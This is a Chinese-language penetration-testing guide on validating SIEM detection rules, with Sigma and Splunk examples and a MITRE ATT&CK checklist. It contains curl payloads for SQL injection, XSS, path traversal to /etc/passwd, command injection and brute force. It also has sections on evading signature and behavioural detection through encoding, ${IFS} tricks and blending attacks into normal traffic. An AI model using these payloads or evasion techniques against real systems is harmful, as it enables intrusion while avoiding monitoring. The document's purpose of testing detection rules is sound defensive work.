# SIEM 规则测试 (SIEM Rule Testing)

---

## 第一部分：文档概述

### 1.1 编写目的
本文档旨在为渗透测试人员提供 SIEM 检测规则测试的系统化方法论，帮助测试人员评估 SIEM 规则的覆盖率和准确性。

### 1.2 适用范围
本文档适用于以下场景：
- Splunk 检测规则测试
- ELK SIEM 规则测试
- Azure Sentinel 规则测试
- AWS Security Hub 规则测试
- 自定义 SIEM 规则验证

### 1.3 读者对象
- 渗透测试工程师
- 安全运营分析师
- 威胁检测工程师
- SIEM 管理员

---

## 第二部分：核心渗透技术专题

### 2.1 技术介绍

SIEM 规则测试是指通过模拟真实攻击行为，验证 SIEM 检测规则能否准确识别恶意活动，评估规则的有效性、准确率和误报率。

**核心原理：**
- **规则覆盖率**：检测规则覆盖的攻击技术范围
- **检测准确率**：规则正确识别攻击的比例
- **误报率**：规则将正常行为误判为攻击的比例
- **漏报率**：规则未能检测到的攻击比例

### 2.2 测试常见于哪些业务场景

| **业务场景** | **功能示例** | **应检测规则** |
| :--- | :--- | :--- |
| **暴力破解** | 多次登录失败 | 登录失败阈值告警 |
| **横向移动** | 多主机登录 | 异常登录模式 |
| **数据外传** | 大量数据下载 | 数据量异常告警 |
| **权限提升** | 敏感命令执行 | 特权命令告警 |
| **恶意软件** | C2 通信 | 威胁情报匹配 |
| **内部威胁** | 非工作时间访问 | 异常行为告警 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**规则覆盖率测试：**
```bash
# 使用 MITRE ATT&CK 框架系统测试
# T1110 - 暴力破解
for i in {1..20}; do
    curl -X POST "http://target/login" \
         -d "username=admin&password=test$i"
done

# T1059 - 命令执行
curl "http://target/api/exec?cmd=whoami"
curl "http://target/api/exec?cmd=id;uname -a"

# T1003 - 凭证转储
curl "http://target/api/admin?action=dump_creds"

# T1048 - 数据外传
curl "http://target/api/export?all=true"

# 记录哪些攻击触发了告警
```

**规则准确性测试：**
```bash
# 发送已知攻击特征
# SQL 注入
curl "http://target/api/user?id=1' OR '1'='1"
curl "http://target/api/user?id=1; DROP TABLE users--"
curl "http://target/api/user?id=1 UNION SELECT * FROM users--"

# XSS
curl "http://target/search?q=<script>alert(1)</script>"
curl "http://target/search?q=<img src=x onerror=alert(1)>"

# 路径遍历
curl "http://target/file?name=../../../etc/passwd"

# 检查 SIEM 是否生成对应告警
```

#### 2.3.2 白盒测试

**规则配置审计：**
```yaml
# Sigma 规则示例
# 检查规则是否覆盖关键场景
title: Suspicious Login Activity
status: experimental
logsource:
    product: application
    service: authentication
detection:
    selection:
        event_type: login_failure
    threshold:
        condition: selection | count() by (user, src_ip) > 5
        timeframe: 5m
level: medium
```

```python
# Splunk SPL 规则审计
# 检查规则有效性
# 危险：规则过于宽泛
index=auth sourcetype=auth_log 
| stats count by src_ip 
| where count > 100
# 可能产生大量误报

# 更好：添加上下文
index=auth sourcetype=auth_log action=login_failure
| stats count by src_ip, user
| where count > 5
| join type=left src_ip 
    [inputlookup known_good_ips]
| where isnull(known_good)
```

### 2.4 漏洞利用方法

#### 2.4.1 识别规则盲点

```bash
# 系统性地测试各种攻击变体
# 测试规则检测边界

# 原始 payload（应被检测）
curl "http://target?cmd=cat /etc/passwd"

# 变体 1：编码
curl "http://target?cmd=$(echo 'cat /etc/passwd' | base64)"

# 变体 2：字符分割
curl "http://target?cmd=c''at /etc/passwd"

# 变体 3：替代命令
curl "http://target?cmd=more /etc/passwd"

# 变体 4：空字节
curl "http://target?cmd=cat%00/etc/passwd"

# 记录哪些变体未被检测
```

#### 2.4.2 规则阈值探测

```bash
# 探测告警触发阈值
# 例如：登录失败阈值

for threshold in 3 5 10 15 20; do
    echo "Testing threshold $threshold"
    for i in $(seq 1 $threshold); do
        curl -X POST "http://target/login" \
             -d "username=admin&password=wrong"
        sleep 1
    done
    # 检查是否触发告警
    if check_alert(); then
        echo "Alert triggered at $threshold attempts"
        break
    fi
done
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过签名检测

```bash
# 如果规则基于签名
# 修改攻击特征

# 原始（被检测）
curl "http://target?cmd=cat /etc/passwd"

# 绕过 1：空格替换
curl "http://target?cmd=cat${IFS}/etc/passwd"

# 绕过 2：命令替换
curl "http://target?cmd=$(echo cAt /ETC/PASSWD)"

# 绕过 3：十六进制
curl "http://target?cmd=$(echo -e '\x63\x61\x74 /etc/passwd')"
```

#### 2.5.2 绕过行为分析

```bash
# 如果规则基于行为分析
# 模拟正常行为模式

# 1. 工作时间攻击
# 只在正常工作时间（9:00-18:00）进行

# 2. 正常流量混合
# 在大量正常请求中夹杂攻击

for i in {1..100}; do
    curl "http://target/normal_page"
    if [ $((i % 10)) -eq 0 ]; then
        curl "http://target/attack_payload"
    fi
done
```

---

## 第三部分：附录

### 3.1 SIEM 规则测试清单

| **攻击技术** | **MITRE ID** | **测试方法** | **预期告警** | **结果** |
| :--- | :--- | :--- | :--- | :--- |
| 暴力破解 | T1110 | 多次登录失败 | 登录失败告警 | ☐ |
| 命令执行 | T1059 | 执行系统命令 | 命令执行告警 | ☐ |
| 凭证访问 | T1003 | 访问凭证存储 | 凭证访问告警 | ☐ |
| 横向移动 | T1021 | 多主机连接 | 异常连接告警 | ☐ |
| 数据外传 | T1048 | 大量数据传输 | 数据外传告警 | ☐ |
| 权限提升 | T1548 | 执行特权命令 | 权限提升告警 | ☐ |
| 防御规避 | T1070 | 清除日志 | 日志清除告警 | ☐ |
| 发现 | T1082 | 系统信息收集 | 侦察活动告警 | ☐ |

### 3.2 规则质量评估标准

- **检测率**：正确检测到的攻击比例
- **误报率**：正常行为被误判的比例
- **平均检测时间（MTTD）**：从攻击发生到检测到的时间
- **覆盖率**：覆盖的 MITRE ATT&CK 技术比例
- **可维护性**：规则是否易于理解和更新

### 3.3 参考资源

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Sigma - Generic Signature Format](https://github.com/SigmaHQ/sigma)
- [Splunk Security Content](https://research.splunk.com/)
- [NIST 800-61 Incident Response Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
